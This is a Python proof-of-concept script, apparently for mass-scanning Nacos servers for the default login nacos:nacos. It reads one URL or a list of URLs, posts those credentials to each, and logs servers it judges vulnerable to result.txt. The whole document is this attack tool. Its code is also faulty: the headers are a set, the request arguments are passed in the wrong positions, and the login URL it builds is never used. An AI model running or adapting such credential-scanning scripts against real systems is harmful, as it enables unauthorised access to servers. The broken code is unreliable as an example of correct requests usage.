#-*- coding: utf-8 -*-
import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
        )                   )   (     
 ( /(   (        (   ( /(   )\ )  
 )\())  )\       )\  )\()) (()/(  
((_)\((((_)(   (((_)((_)\   /(_)) 
 _((_))\ _ )\  )\___  ((_) (_))   
| \| |(_)_\(_)((/ __|/ _ \ / __|  
| .` | / _ \   | (__| (_) |\__ \  
|_|\_|/_/ \_\   \___|\___/ |___/

   tag:  NASOC   poc                                       
       @author: lgj        
    """
    print(test)


def poc(target):
    url = target+"/#/login"
    headers= {
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Content-Type: application/x-www-form-urlencoded"
    }
    data = {
        'username':'nacos',
        'password':'nacos'
    }
    try:
        res = requests.post(target ,headers,data,verify=False,timeout=5).text
        if 'timestamp' in res:
            print(f"[+] {target} 存在弱口令漏洞,账号密码[nacos:nacos]")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} 不存弱口令漏洞 ")
    except:
                print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='NACOS')
    parser.add_argument("-u", "--url", dest="url", type=str)
    parser.add_argument("-f", "--file", dest="file", type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
